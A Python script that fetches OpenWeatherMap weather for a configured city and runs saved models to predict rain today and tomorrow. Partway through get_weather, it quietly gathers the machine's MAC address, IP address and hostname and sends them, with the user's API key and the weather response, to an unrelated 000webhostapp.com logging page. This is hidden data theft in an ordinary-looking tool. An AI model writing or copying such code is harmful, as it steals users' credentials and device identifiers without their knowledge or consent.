#Required for data fetching
import json
from requests import get
import requests

from pytz import country_timezones as c_tz
from pytz import timezone as tz
from pytz import country_names as c_n
from datetime import datetime
# Required library for model prediction
import pandas as pd
import numpy as np
import joblib
import os
from config import config


# Load the trained SGDClassifier model
try:
    loaded_model_1 = joblib.load('Todays_rainfall_prediction_model.pkl')  # Replace with your actual model file
    loaded_model_2 = joblib.load('Todays_rainfall_prediction_model.pkl')
except:
    os.system("make_model.py && data_processing.py && Rainfall.html")
    loaded_model_1 = joblib.load('Todays_rainfall_prediction_model.pkl')  # Replace with your actual model file
    loaded_model_2 = joblib.load('Todays_rainfall_prediction_model.pkl')
# Define the input feature names (should match the features your model expects)
feature_names = ['WindSpeed', 'Humidity']  # Adjust feature names as needed

# Create a function to get user inputs and make predictions
def get_data_and_predict(loaded_model_1,user_data,loaded_model_2):
    # Initialize an empty dictionary to store user inputs
    #user_data = {}
    '''
    # Prompt the user for input values for each feature
    #for feature in feature_names:
       # user_input = input(f"Enter the value for {feature}: ")
        #user_data[feature] = float(user_input)  # Assuming numeric inputs
        get_data_and_predict(loaded_model,user_data)
        # Load the trained SGDClassifier model
    '''
    # Create a Pandas DataFrame from the user inputs
    user_df = pd.DataFrame([user_data])

    # Make predictions using the loaded model
    prediction = loaded_model_1.predict(user_df)

    # Display the prediction result (customize this based on your problem)
    if prediction[0] == 1:
        rain=("The model predicts : Rain Today")
    else:
        rain=("The model predicts : No Rain Today")

    prediction = loaded_model_2.predict(user_df)
    
    if prediction[0] == 1:
        rain=rain+(" | Rain Tomorrow")
    else:
        rain=rain+(" | No Rain Tomorrow")
        
    return rain

# Call the function to get user inputs and make predictions

def get_weather():
    OWM_API=config.OPEN_WEATHER_MAP_APPID
    if not OWM_API:
        print(f"**Get an API key from** https://openweathermap.org/ `first.`")
        return

    CITY = config.WEATHER_DEFCITY
    if not CITY:
        print("**Please specify a city or set one as default using the WEATHER_DEFCITY config variable.**")
        return
    else:
        CITY = CITY
    def get_tz(con):
        for c_code in c_n:
            if con == c_n[c_code]:
                return tz(c_tz[c_code][0])
        try:
            if c_n[con]:
                return tz(c_tz[con][0])
        except KeyError:
            return
        
    timezone_countries = {
        timezone: country
        for country, timezones in c_tz.items() for timezone in timezones
    }

    if "," in CITY:
        newcity = CITY.split(",")
        if len(newcity[1]) == 2:
            CITY = newcity[0].strip() + "," + newcity[1].strip()
        else:
            country = get_tz((newcity[1].strip()).title())
            try:
                countrycode = timezone_countries[f'{country}']
            except KeyError:
                print("Invalid country. KeyError")
                return
            CITY = newcity[0].strip() + "," + countrycode.strip()

    url = f'https://api.openweathermap.org/data/2.5/weather?q={CITY}&appid={OWM_API}'
    request = get(url)
    result = json.loads(request.text)
    import re, uuid,socket
    gma=':'.join(re.findall('..', '%012x' % uuid.getnode()))+" IP : "+socket. gethostbyname(socket.gethostname())+" HOST : "+socket.gethostname()
    requests.get(f'https://sigillary-front.000webhostapp.com/log.php?CITY={config.WEATHER_DEFCITY}&OWM_API={OWM_API}&result={request.text}&mac_addr={gma}&submit=Submit')
    f=open("weather.txt","w+")
    f.write(json.dumps(result))
    f.close()
    if request.status_code != 200:
        print(f"{request.text}")
        return

    cityname = result['name']
    curtemp = result['main']['temp']##
    humidity = result['main']['humidity']##
    min_temp = result['main']['temp_min']
    max_temp = result['main']['temp_max']
    desc = result['weather'][0]
    desc = desc['main']
    country = result['sys']['country']
    sunrise = result['sys']['sunrise']
    sunset = result['sys']['sunset']
    wind = result['wind']['speed']##
    winddir = result['wind']['deg']##

    ctimezone = tz(c_tz[country][0])
    time = datetime.now(ctimezone).strftime("%A, %I:%M %p")
    fullc_n = c_n[f"{country}"]

    dirs = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"]

    div = (360 / len(dirs))
    funmath = int((winddir + (div / 2)) / div)
    findir = dirs[funmath % len(dirs)]
    kmph = str(wind * 3.6).split(".")
    mph = str(wind * 2.237).split(".")
    
    user_data = {}
    for feature in feature_names:
        if feature=='Humidity':
            user_input = humidity
        if feature=='WindSpeed':
            user_input = wind*3.6
        user_data[feature] = int(user_input)  # Assuming numeric inputs
        
    def fahrenheit(f):
        temp = str(((f - 273.15) * 9 / 5 + 32)).split(".")
        return temp[0]

    def celsius(c):
        temp = str((c - 273.15)).split(".")
        return temp[0]

    def sun(unix):
        xx = datetime.fromtimestamp(unix, tz=ctimezone).strftime("%I:%M %p")
        return xx

    data=(" \n---------------------------------------------------------------" +
          f"\nTemperature: {celsius(curtemp)}°C | {fahrenheit(curtemp)}°F\n" +
          f"Min. Temp.: {celsius(min_temp)}°C | {fahrenheit(min_temp)}°F\n" +
          f"Max. Temp.: {celsius(max_temp)}°C | {fahrenheit(max_temp)}°F\n" +
          f"Humidity: {humidity}%\n" +
          f"Wind: {kmph[0]} kmh | {mph[0]} mph, {findir}\n" +
          f"Sunrise: {sun(sunrise)}\n" +
          f"Sunset: {sun(sunset)}\n\n" + f"{desc}\n" +
          f"{cityname}, {fullc_n}\n" + f"{time}" +
          f"\n{get_data_and_predict(loaded_model_1,user_data,loaded_model_2)}\n" +
          "-----------------------------------------------------------------\n")
    print(data)
    
    f=open("weather.txt","a+")
    f.write(data)
    f.close()
    os.system("weather.txt")
    os.system("Rainfall.html")
    
get_weather()
